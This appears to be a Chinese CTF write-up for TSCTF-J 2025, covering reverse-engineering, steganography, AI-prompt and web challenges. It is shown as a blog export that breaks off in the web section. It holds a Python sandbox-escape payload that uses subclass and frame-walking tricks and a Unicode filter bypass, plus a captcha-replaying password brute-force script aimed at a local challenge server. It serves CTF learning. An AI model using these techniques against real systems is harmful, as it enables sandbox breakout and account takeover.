CryDancing\n\n苹果逆向终究还是来了吗......\n\n上次在哪里的ipa逆向连可执行文件都没找到😅，这次总算找到了，先静态分析\n\n![alt text](image-48.png)\n\n从strings里面找到可能相关的字符串，进到了核心逻辑，大概就是把输入（obj）进行加密（YouCanSeeThisRight），然后与目标字符串对比，下面进到加密函数\n\n![alt text](image-49.png)\n\n这里先执行GetKey函数，然后把它重复四遍作为下面CCCrypt的密钥，经过搜索，这个应该是AES，用的是CBC模式，iv是375（小端），然后进到GetKey函数\n\n![alt text](image-50.png)\n\n反编出来的代码奇奇怪怪的，不过关键的是：这个函数返回四个大写字母，并且返回值的MD5是已知的，所以直接爆破\n\n```sh\nhashcat -a 3 -m 0 674040176a34f6c994003fe85badfc48 ?u?u?u?u\n```\n\n![alt text](image-51.png)\n\n得到返回值：NOTD，也就是说，key就是NOTDNOTDNOTDNOTD\n\n下面用python恢复flag\n\n![alt text](image-52.png)\n\n```python\nimport base64\n\nfrom Crypto.Cipher import AES\n\ncipher = AES.new(b'NOTDNOTDNOTDNOTD', AES.MODE_CBC, iv=(375).to_bytes(16, 'little'))\n\nprint(cipher.decrypt(base64.b64decode('bvOaEEh1F5pDkMpM6n5src+Jym4ineiRvbWRIidoLHD1KGuRk8vyRsDpQ4XGYtNKnQDvFBEnG3DsCDGqJ8Xv8g==')))\n```\n\n得到flag\n\n<box>TSCTF-J{S0rry_th3_4nswer_h4s_n0thing_2_do_with_l7rics}</box>\n\n### \\[re\\] 哭泣之子\n\n这是什么新型的阴乐播放器吗（突然想起来传说中的O泡果奶病毒）\n\n拿到附件，发现这是一个.Net程序，用dnSpy打开，没有发现加密逻辑，然后就进行调试\n\n![alt text](image-53.png)\n\n在输出里发现了一行报错：找不到文件flag，那就肯定是核心逻辑了，在对应异常上下断点（调试-\\>窗口-\\>异常设置）\n\n![alt text](image-54.png)\n\n之后成功停下，再沿着调用堆栈往回翻，发现加密逻辑\n\n![alt text](image-55.png)\n\n接下来就是解密啦\\~\n\n因为这个不好直接解密（实际上也无法直接解密），所以使用z3求解，下面给出代码：\n\n```python\nimport z3\narray3 = [871, 1654, 789, 1617, 1221, 2173, 871, 1724, 629, 1111, 789,\n1664, 783, 1579, 989, 1633, 1229, 2148, 891, 1703, 1237, 2249, 1229,\n2161, 1157, 2095, 1237, 2201, 1243, 2166, 789, 1604, 941, 1669, 813,\n1651, 845, 1633, 807, 1645, 941, 1673, 971, 1863, 941, 1648, 789, 1620,\n941, 1659, 1255, 2157, 1167, 2121, 941, 1647, 807, 1662, 845, 1634,\n1243, 2165, 813, 1650, 941, 1676, 813, 1697, 783, 1589, 941, 1654, 1167,\n2097, 1255, 2157, 941, 1673, 789, 1597, 941, 1655, 941, 1653, 813, 1673,\n789, 1598, 891, 1735, 941, 1600, 629, 1076, 891, 1728, 603, 1008, 389,\n827]\na3o = array3[:]\nfor k in range(0, 99, 2):\n    solver = z3.Solver()\n    a2k, a2kp1 = z3.BitVecs('a2k a2kp1', 32)\n    solver.add(a2k<=125)\n    solver.add(a2kp1<=125)\n    solver.add(a2k>=32)\n    solver.add(a2kp1>=32)\n    num = a2k << 3 ^ 83\n    a2kn = (num + a2k ^ a2k + 72)\n    a2kp1n = a2kn + (num ^ a2kp1)\n    solver.add(a2kn == array3[k])\n    solver.add(a2kp1n == array3[k+1])\n    assert solver.check() == z3.sat\n    array3[k] = solver.model()[a2k].as_long()\n    array3[k+1] = solver.model()[a2kp1].as_long()\n\nprint(bytes(array3))\n```\n\n当然，在没有提示之前，我写的范围是\\[0, 256\\)，解出来的flag长这样：\n\n![alt text](image-56.png)\n\n里正确答案只剩下两个字符（即一个方程组）了，当时太晚了，没有再想想就睡觉了，早上看到提示后就解出来了\n\n正确flag：\n\n<box>flag{3f619a0b_Would_you_say_that_someone_who_had_every_intention_to_be_brave_was_a_coward?_81dd64f3}</box>\n\n注：判断完正误是有回显的，程序会修改NAudio.Midi.dll的前几字节\n\n![alt text](image-57.png)\n\n<div>\n<img src=\"image-58.png\" style=\"float: right\">\n\n又注：一开始把注意力放到提取阴乐的地方去了，发现还有一张png图片内嵌了（其实就是应用的图标），在这里放出来，吓💩你们~~（bushi~~\n</div>\n\n### \\[re\\] Catbits\n\n编程猫逆向？什么玩意儿（丢）\n\n其实这道题没那么难，只是逻辑不太好找而已，真正逆向很简单\n\n考虑到大家可能都没有学过编程猫（其实我也没学过），从配置环境开始\n\n1.  安装Scratch\n\n一般情况我都是在官网下安装包的，奈何官网被ban了，那就从Microsoft Store凑合一下吧\n\n![alt text](image-59.png)\n\n2.  打开项目\n\n启动程序，然后\"文件\"-\\>\"从电脑中打开\"\n\n![alt text](image-60.png)\n\n3.  查看代码逻辑\n\n![alt text](image-61.png)\n\n额......这有加密逻辑？输入都没找到啊，不会被隐藏了吧......\n\n如果你有这种想法，那就和我掉进一个坑里了\n\n我们可以看看.sb3（本质是.zip）里面的project.json，你其实会发现：它的代码是按人物存储的！比如下图，上面的blocks里面存储的就是\"角色1\"的代码，下面的blocks则是\"角色3\"的。那我们怎么看其他代码呢？\n\n![alt text](image-62.png)\n\n没错，在右边选其他角色就好了\n\n![alt text](image-63.png)\n\n![alt text](image-64.png)\n\n（没错，就是这么简单粗暴）\n\n接下来就是还原代码逻辑了，不过可能确实有一段逻辑（orc-\\>arc），通过简单测试，可以恢复，下面是用python重写的逻辑（有一些太啰嗦了，直接改写了，原逻辑被注释了）：\n\n```python\nsrc = [211, 717, 210, 132, 193, 114, 244, 208, 213, 99, 37, 214, 224, 101, 98, 212, 224, 118]\n\n# 消息1\norc = []\narc = []\nindex = 1\nend = 0\nwhile end != 1:\n    answer = input()\n    if answer == '#':\n        end = 1\n    else:\n        orc.append(answer)\n        index += 1\n\n# nonomi\n# 没有找到ToKo触发逻辑，根据调试，恢复如下\narc = [114] + [ord(c)+1 for c in orc]\n\nyindex = 1\nwhile yindex <= len(arc) +1:\n    # Shiroko\n    def Bravo(Amy): # 就是(值+项数)%255\n        global iNdex\n        iNdex = yindex\n        ij = arc[iNdex-1]\n        kl = ij + Amy\n        if kl > 255:\n            mn = kl-255\n        else:\n            mn = kl\n        return mn\n    arc[iNdex-1] = Bravo(yindex)\n    yindex += 1 # PDF的WP这里好像漏了一行\n\nyindex = 2\nwhile yindex <= len(arc) +1:\n    # murasame\n    def Charlie(Alice, Bob): # 就是异或\n        # ret = 0\n        # v1 = round(Alice)\n        # v2 = round(Bob)\n        # v5 = 1\n        # while not (v1 == v2 == 0):\n        #     v3 = v1 % 2\n        #     v4 = v2 % 2\n        #     v6 = (v3+v4) % 2\n        #     ret += v5*v6\n        #     v1 //= 2\n        #     v2 //= 2\n        #     v5 *= 2\n        # return ret\n        return Alice ^ Bob\n    arc[yindex-1] = Charlie(arc[yindex-1], arc[yindex-2])\n    yindex += 1\n\nyindex = 1\nwhile yindex <= len(arc) +1:\n    # abstruse\n    # def Delta(Masking):\n    #     return Masking % 16 * 16\n    # def Echo(Layer):\n    #     return Layer // 16\n    # def Foxfort(ChuChu, Pareo):\n    #     return Charlie(ChuChu, Pareo)\n    # arc[yindex-1] = Foxfort(Delta(arc[yindex-1]),Echo(arc[yindex-1]))\n    tmp = arc[yindex-1]\n    arc[yindex-1] = (tmp>>4)|((tmp&0xf)<<4)\n    yindex += 1\n\nyindex = 2\nwhile yindex <= len(arc) +1:\n    # XiaoYuan\n    def Hotel(Lock):\n        if arc[Lock-1] != src[Lock-2]:\n            exit(-1)\n    if len(src) != len(arc)-1:\n        exit(-1)\n    else:\n        Hotel(yindex)\n\nprint('FLAG:', ''.join(arc))\n```\n\n大致加密过程是：转序号、值加编号、前后异或、交换高低位\n\n所以给出解密代码：\n\n```python\nsrc0 = [211, 71, 210, 132, 193, 114, 244, 208, 213, 99, 37, 214, 224, 101, 98, 212, 224, 118]\n\nsrc = [114]+[(v>>4)|((v&0xf)<<4) for v in src0]\n\ndst = []\nwhile len(src) > 1:\n    num = src.pop()\n    dst.append(num^src[-1])\ndst = src + dst[::-1]\n\nori = [(c-i-1-1)%255 for i, c in enumerate(dst)]\n\nprint(bytes(ori))\n```\n\n![alt text](image-65.png)（p对应114）\n\n<box>TSCTF-J{LET_M3_8E_W1TH_Y0U}</box>\n\n## 【附】JustReverse的代码（失败品）：\n\n```python\nimport numpy as np\n\nn = 58\n\nimport torch\nimport torch.nn as nn\nclass Net(nn.Module):\n    def __init__(self):\n        super(Net, self).__init__()\n        self.linear = nn.Linear(n, n*n)\n        self.conv1=nn.Conv2d(1, 1, (2, 2), stride=2)\n        self.conv2=nn.Conv2d(1, 1, (1, 1), stride=1)\n        self.conv3=nn.Conv2d(1, 1, (2, 2), stride=1, padding=1)\n        self.relu=nn.ReLU()\n\n    def forward(self, x):\n        x = x.view(1, 1, 2, 2*n)\n        x = self.conv1(x)\n        x = self.relu(x)\n        x = self.conv2(x)\n        x = x.view(n)\n        x = self.linear(x)\n        x = x.view(1, 1, n, n)\n        x = self.conv3(x)\n        return x\n\nmynet=Net()\nmynet.load_state_dict(torch.load('model.pth'))\n\nout = list(map(lambda line: list(map(float, line.split(' '))), open('ciphertext.txt').readlines()))\n\nout = np.array(out)\n\nout -= mynet.conv3.bias.detach().numpy()\n\n# print(out)\n\ndef reverse_conv(kernel, after, before_size):\n    last_line = [0] + [0] * before_size + [0]\n    before = []\n    for i in range(before_size):\n        line = [0]\n        for j in range(before_size):\n            line.append((after[i][j] - kernel[0][0] * last_line[j] - kernel[0][1] * last_line[j+1] - kernel[1][0] * 0)/kernel[1][1])\n        last_line = line + [0]\n        before.append(line[1:])\n    return before\n\noutl = reverse_conv(mynet.conv3.weight.detach().numpy().reshape((2, 2)).tolist(), out.tolist(), n)\n\n# print(outl)\n\nlb = mynet.linear.bias.detach().numpy()\nlw = mynet.linear.weight.detach().numpy()\n\n# print(lb.shape)\n# print(lw.shape)\n\nout2 = np.linalg.inv(lw.T @ lw) @ (lw.T @ (np.array(outl).reshape((-1)) - lb))\n\n# print(out2)\n\nout1 = (out2 - mynet.conv2.bias.detach().numpy()) / mynet.conv2.weight.detach().numpy()\n\n# print(out1)\n\nw1 = mynet.conv1.weight.detach().numpy()\nb1 = mynet.conv1.bias.detach().numpy()\n\nori = (out1 - b1).reshape((-1))\n\nprint(ori)\najust = [round(i) for i in ori.tolist()]\nprint(ajust)\nb = sum([[i&1, (i&2)//2] for i in ajust], []) + sum([[(i&4)//4, (i&8)//8] for i in ajust], [])\nfor i in range(0, len(b), 8):\n    print(chr(int(''.join(map(str, b[i:i+8])), base=2)), end='', flush=True)\n```\n\n<script>\n  // 修复图炸的情况\n  (new Array(...document.getElementsByTagName('img'))).forEach(\n      img=>{\n          if(img.src.split('/')[3]!='images'&&!img.src.startsWith(location.href.split(\"#\")[0])){\n              console.log(`\"${decodeURI(img.src.split('/').slice(-1))}\" 貌似炸了`)\n              img.src=img.src.split('/').slice(-1)\n          }\n  })\n</script>","slug":"TSCTF-J2025-WP","published":1,"updated":"2026-01-02T18:45:10.639Z","comments":1,"layout":"post","photos":[],"_id":"cmk9p9p3t0006h4vbebjn0kfn","content":"<p>由于是用Word写的啦，还要转成markdown才能传上来，下面给出PDF版本的WP链接</p>\n<p><a href=\"%E5%9C%86%E5%91%A8%E7%8E%87WP.pdf\">TSCTF-J2025 WP</a></p>\n<p>下面的内容与上面一致，但由于转换时的疏忽，可能会：多反斜杠&#x2F;少反斜杠&#x2F;多出莫名其妙的星号&#x2F;多出莫名其妙的换行，请谅解！</p>\n<p>最近会抽空对TSCTF-J2025进行复盘，敬请期待~</p>\n<blockquote>\n<p>不知道为什么图片路径可能会炸掉，在最后面写了一个简易的修复代码，不能保证一定有用</p>\n<p>如果图炸了的话请手动拼接URL，为</p>\n<p><span id=\"urlNow\"></span>image-编号.png</p>\n</blockquote>\n<script>\n  document.getElementById(\"urlNow\").innerText = location.href.split('#')[0]\n  document.getElementById(\"urlNow\").innerText += location.href.split('#')[0].slice(-1)==='/'?'':'/'\n</script>\n\n<h2 id=\"Abstract\"><a href=\"#Abstract\" class=\"headerlink\" title=\"Abstract\"></a>Abstract</h2><h3 id=\"ab-The-Great\"><a href=\"#ab-The-Great\" class=\"headerlink\" title=\"[ab] The Great\"></a>[ab] The Great</h3><p><img src=\"/image.png\" alt=\"alt text\"></p>\n<div>\n<img src=\"image-1.png\" style=\"float:right; zoom:0.7\">\n\n<p>这题一开始也是没有思路的，后来放了很多提示，决定好好想一想。</p>\n<p>首先看到提示2，要我们写出音名：</p>\n</div>\n\n<p><img src=\"/image-2.png\" alt=\"alt text\"></p>\n<p>然后add（+）是一个很重要的提示，如果把ABCD……映射为1234……，那么音符就可以相加了，以第二个音为例：</p>\n<p>$$F_{6} + C_{3} &#x3D; I_{9}$$</p>\n<p>由此，我们可以得出两个单词：EINSTEIN EQUATION，再结合提示1，应当以Latex形式写出爱因斯坦方程，故flag为</p>\n<style>\n  box {\n    border: 1px solid;\n    padding: 2px;\n    font-weight: bold;\n  }\n</style>\n\n<p><box>TSCTF-J{E&#x3D;mc^2}</box></p>\n<h2 id=\"Misc\"><a href=\"#Misc\" class=\"headerlink\" title=\"Misc\"></a>Misc</h2><h3 id=\"misc-Meow\"><a href=\"#misc-Meow\" class=\"headerlink\" title=\"[misc] Meow\"></a>[misc] Meow</h3><p>这题一开始没思路，后面做了几题才回来的，因为一眼丁真看到了”vfnd”（”TSC”的base64是”VFND”）</p>\n<p><img src=\"/image-3.png\" alt=\"alt text\"></p>\n<p>虽然全是Meow，但是根据程序格式，可以猜出：</p>\n<p><img src=\"/image-4.png\" alt=\"alt text\"></p>\n<p>所以最后输出的是：</p>\n<p><img src=\"/image-5.png\" alt=\"alt text\"></p>\n<p>结合vfnd，猜测这是大小写反转的base64，进行解码</p>\n<p><img src=\"/image-6.png\" alt=\"alt text\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">In [1]: import base64</span><br><span class=\"line\"></span><br><span class=\"line\">In [2]: t = &#x27;vfndveyTsNSkmv9bBq==xZrFq2fux01LB3Dnztb3iseHFq==&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">In [3]: import string</span><br><span class=\"line\"></span><br><span class=\"line\">In [4]: t = t.translate(str.maketrans(string.ascii_uppercase+string.ascii_lowercase, string.ascii_lowercase+string.ascii_uppercase))</span><br><span class=\"line\"></span><br><span class=\"line\">In [5]: base64.b64decode(t)</span><br><span class=\"line\"></span><br><span class=\"line\">Out[5]: b&#x27;TSCTF-J&#123;\\n1_Am&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">In [6]: base64.b64decode(t.split(&#x27;==&#x27;, 1)[1])</span><br><span class=\"line\"></span><br><span class=\"line\">Out[6]: b&#x27;_4_CaT_MeowMe0w!!!&#125;&#x27;</span><br></pre></td></tr></table></figure>\n\n<p>最后把换行符去掉，就得到了flag</p>\n<p><box>TSCTF-J{1_Am_4_CaT_MeowMe0w!!!}</box></p>\n<h3 id=\"misc-卢森堡的秘密\"><a href=\"#misc-卢森堡的秘密\" class=\"headerlink\" title=\"[misc] 卢森堡的秘密\"></a>[misc] 卢森堡的秘密</h3><p>拿到zip和png，先进行binwalk和pngcheck，没有发现异常，考虑LSB，找到一个在线网站：<a href=\"https://georgeom.net/StegOnline/upload\">https://georgeom.net/StegOnline/upload</a></p>\n<p><img src=\"/image-7.png\" alt=\"alt text\"></p>\n<p>找到flag</p>\n<p><box>TSCTF-J{Th3_sEcre7_0f_L$B!}</box></p>\n<h3 id=\"misc-BadFile\"><a href=\"#misc-BadFile\" class=\"headerlink\" title=\"[misc] BadFile\"></a>[misc] BadFile</h3><p>先强烈推荐一个Windows开源软件<a href=\"https://github.com/QL-Win/QuickLook\">https://github.com/QL-Win/QuickLook</a>，把苹果的QuickLook功能在Windows上复刻了，特别方便！按空格后还可以按上下键翻动</p>\n<p>先看txt</p>\n<p>经过翻找，发现好像几段泄露文本都有数字？那就启动grep</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">grep -r -P <span class=\"string\">&#x27;\\d&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/image-8.png\" alt=\"alt text\"></p>\n<p>完美！</p>\n<p>下面看wav</p>\n<p>经过翻找，发现几段泄露音频都比较长，于是通过时长降序排列，发现前四都是</p>\n<p><img src=\"/image-9.png\" alt=\"alt text\"></p>\n<p>那……还有一段呢？只好慢慢翻了</p>\n<p>翻了好久终于找到了！居然只有1秒？？</p>\n<p><img src=\"/image-10.png\" alt=\"alt text\"></p>\n<p>“我的家在北京市朝阳区”……懂了，马上去线下真实你🤬</p>\n<p>最后是pdf</p>\n<p>经过翻找，发现恶意文件会弹窗，由于没有想到好的方法，一一查找</p>\n<p><img src=\"/image-11.png\" alt=\"alt text\"></p>\n<p>最后合成flag</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">In [1]: pdf = list(sorted(&#x27;&#x27;&#x27;8YmxZRca.pdf</span><br><span class=\"line\">...: mFU1SdVp.pdf</span><br><span class=\"line\">...: w9V1ZDEd.pdf</span><br><span class=\"line\">...: xdBqKtxe.pdf</span><br><span class=\"line\">...: Z8P4DHre.pdf&#x27;&#x27;&#x27;.split(&#x27;\\n&#x27;)))</span><br><span class=\"line\"></span><br><span class=\"line\">In [2]: txt = list(sorted(&#x27;&#x27;&#x27;3WQlwSaj.txt</span><br><span class=\"line\">...: dubZ3AZn.txt</span><br><span class=\"line\">...: nhlbNxGL.txt</span><br><span class=\"line\">...: qtFyaGkZ.txt</span><br><span class=\"line\">...: wlBUCOeg.txt&#x27;&#x27;&#x27;.split(&#x27;\\n&#x27;)))</span><br><span class=\"line\"></span><br><span class=\"line\">In [3]: wav = list(sorted(&#x27;&#x27;&#x27;2JuiKL42.wav</span><br><span class=\"line\">...: 4UjLqeRF.wav</span><br><span class=\"line\">...: Ew24ldS2.wav</span><br><span class=\"line\">...: HjRtD6f3.wav</span><br><span class=\"line\">...: RtUwEgj1.wav&#x27;&#x27;&#x27;.split(&#x27;\\n&#x27;)))</span><br><span class=\"line\"></span><br><span class=\"line\">In [4]: &#x27;_&#x27;.join([&#x27;_&#x27;.join(l) for l in [txt, wav, pdf]])</span><br><span class=\"line\"></span><br><span class=\"line\">Out[4]:</span><br><span class=\"line\">&#x27;3WQlwSaj.txt_dubZ3AZn.txt_nhlbNxGL.txt_qtFyaGkZ.txt_wlBUCOeg.txt_2JuiKL42.wav_4UjLqeRF.wav_Ew24ldS2.wav_HjRtD6f3.wav_RtUwEgj1.wav_8YmxZRca.pdf_Z8P4DHre.pdf_mFU1SdVp.pdf_w9V1ZDEd.pdf_xdBqKtxe.pdf&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">In [5]: import hashlib</span><br><span class=\"line\"></span><br><span class=\"line\">In [6]: hashlib.md5(_.encode()).hexdigest()</span><br><span class=\"line\"></span><br><span class=\"line\">Out[6]: &#x27;0b4a2a6431f6b94b3c1d3d50d0a45aea&#x27;</span><br></pre></td></tr></table></figure>\n\n<p><box>TSCTF-J{0b4a2a6431f6b94b3c1d3d50d0a45aea}</box></p>\n<h3 id=\"misc-PyJail\" style=\"opacity:0.6;\">[misc] PyJail （半成品）</h3>\n\n<p>拿到代码，发现globals受限，AST不允许访问”__“开头的属性。</p>\n<p>一开始打算用反射获得完整环境：（这里157是os._wrap_close的index，以实际情况为准）</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&#x27;&#x27;</span>.__class__.__mro__[<span class=\"number\">1</span>].__subclasses__()[<span class=\"number\">157</span>].__init__.__globals__</span><br></pre></td></tr></table></figure>\n\n<p>那么就需要绕过”__“，使用Unicode绕过</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&#x27;&#x27;</span>._＿class__._＿mro__[<span class=\"number\">1</span>]._＿subclasses__()[<span class=\"number\">157</span>]._＿init__._＿globals__</span><br></pre></td></tr></table></figure>\n<p><img src=\"/image-12.png\" alt=\"alt text\"></p>\n<p>但是此举触发了import钩子，失败，接下来考虑栈帧逃逸</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">print</span>(g:=[*(q:=(q.gi_frame.f_back.f_back.f_globals <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> [<span class=\"number\">1</span>]))][<span class=\"number\">0</span>])</span><br></pre></td></tr></table></figure>\n\n<p>成功获得globals，但是接下来就没有思路了：</p>\n<ul>\n<li><p>os.system&#x2F;popen、subprocess都被ban了</p>\n</li>\n<li><p>_posixsubprocess不在sys.modules里，也无法被__loader__加载</p>\n</li>\n<li><p>写WP的时候突然想到会不会在环境变量里，确认了一下，也没有</p>\n</li>\n</ul>\n<p><img src=\"/image-13.png\" alt=\"alt text\"></p>\n<p><box style=\"opacity: 0.6;\">PLACEHOLDER{TA5K_F4ILED}</box></p>\n<h2 id=\"AI\"><a href=\"#AI\" class=\"headerlink\" title=\"AI\"></a>AI</h2><h3 id=\"ai-Coup\"><a href=\"#ai-Coup\" class=\"headerlink\" title=\"[ai] Coup\"></a>[ai] Coup</h3><p>拿到题目还不知道是干什么的，看AI玩了一局才明白：我们要给代表我们的AI玩家写prompt，来指导它赢得比赛，下面给出我的提示词：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">You are a good Coup Game Player, your aim is to earn a lot money then to</span><br><span class=\"line\">coup the other player to death while keep you alive</span><br></pre></td></tr></table></figure>\n\n<p>经过测试，一遍拿到flag，但是仍有改进的余地，AI明显把赚钱放在了第一位，只有到10+才会被迫coup别人，可以强调一下两个任务的优先级。</p>\n<p>flag是什么来着？不记得了！😰</p>\n<p><box style=\"opacity:0.6;\">PLACEHOLDER{I_forg0t_mY_fl@g}</box></p>\n<h3 id=\"ai-JustReverse\" style=\"opacity: 0.6;\">[ai] JustReverse （失败）</h3>\n\n<p>根据给出的模型和参数，进行反向求解，但是哪里似乎写错了&#x2F;不够精确，没有求出flag，代码附在最后。</p>\n<p><img src=\"/image-14.png\" alt=\"alt text\"></p>\n<p>（你总不能跟我讲这个就是flag吧）</p>\n<p><box style=\"opacity: 0.6;\">PLACEHOLDER{T4SK_FA1L3D}</box></p>\n<h2 id=\"Web\"><a href=\"#Web\" class=\"headerlink\" title=\"Web\"></a>Web</h2><h3 id=\"web-EZ-Login（签到）\"><a href=\"#web-EZ-Login（签到）\" class=\"headerlink\" title=\"[web] EZ_Login（签到）\"></a>[web] EZ_Login（签到）</h3><p>一个登录界面，先尝试SQL注入，发现貌似没有注入点。</p>\n<p>下面采取爆破，因为有验证码，但好像只要有某一次的session就提交对应的验证码就好了，下面的脚本还是模拟了登录全流程，并且加了连接中断的处理</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">crack</span>(<span class=\"params\">pwd</span>):</span><br><span class=\"line\"></span><br><span class=\"line\">    s = requests.Session()</span><br><span class=\"line\"></span><br><span class=\"line\">    cookies = &#123;</span><br><span class=\"line\">        <span class=\"comment\"># 省略</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    headers = &#123;</span><br><span class=\"line\">        <span class=\"comment\"># 省略</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    response = s.get(<span class=\"string\">&#x27;http://127.0.0.1:54655/login&#x27;</span>, cookies=cookies, headers=headers)</span><br><span class=\"line\"></span><br><span class=\"line\">    data = &#123;</span><br><span class=\"line\">        <span class=\"string\">&#x27;username&#x27;</span>: <span class=\"string\">&#x27;admin&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;password&#x27;</span>: pwd,</span><br><span class=\"line\">        <span class=\"string\">&#x27;captcha&#x27;</span>: <span class=\"string\">&#x27;&#x27;</span>.join(re.findall(<span class=\"string\">r&#x27;(?&lt;=captcha_images/)\\d(?=\\.png)&#x27;</span>, response.text))</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    response = s.post(</span><br><span class=\"line\">        <span class=\"string\">&#x27;http://127.0.0.1:54655/login&#x27;</span>,</span><br><span class=\"line\">        cookies=cookies,</span><br><span class=\"line\">        headers=headers,</span><br><span class=\"line\">        data=data,</span><br><span class=\"line\">    )</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(re.findall(<span class=\"string\">f&#x27;&gt;.*?错误.*?&lt;&#x27;</span>, response.text))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">&#x27;错误&#x27;</span> <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> response.text</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i, pwd <span class=\"keyword\">in</span> <span class=\"built_in\">enumerate</span>(<span class=\"built_in\">open</span>(<span class=\"string\">&#x27;D:/PiYuanZhouLv/rockyou.txt&#x27;</span>)):</span><br><span class=\"line\">    pwd = pwd.strip()</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> pwd.startswith(<span class=\"string\">&#x27;s&#x27;</span>):</span><br><span class=\"line\">        <span class=\"keyword\">continue</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(i, pwd)</span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            <span class=\"keyword\">if</span> crack(pwd):</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(<span class=\"string\">&quot;THE PASSWORD IS&quot;</span>, pwd)</span><br><span class=\"line\">                exit()</span><br><span class=\"line\">        <span class=\"keyword\">except</span>:</span><br><span class=\"line\">            <span class=\"keyword\">import</span> time</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;Have a rest!&#x27;</span>)</span><br><span class=\"line\">            time.sleep(<span class=\"number\">10</span>)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br></pre></td></tr></table></figure>\n\n<p>部分代码由<a href=\"https://curlconverter.com/\">https://curlconverter.com/</a>生成</p>\n<p>运行，得到密码”simple”，尝试登录，提示”非本地管理员”</p>\n<p><img src=\"/image-15.png\" alt=\"alt 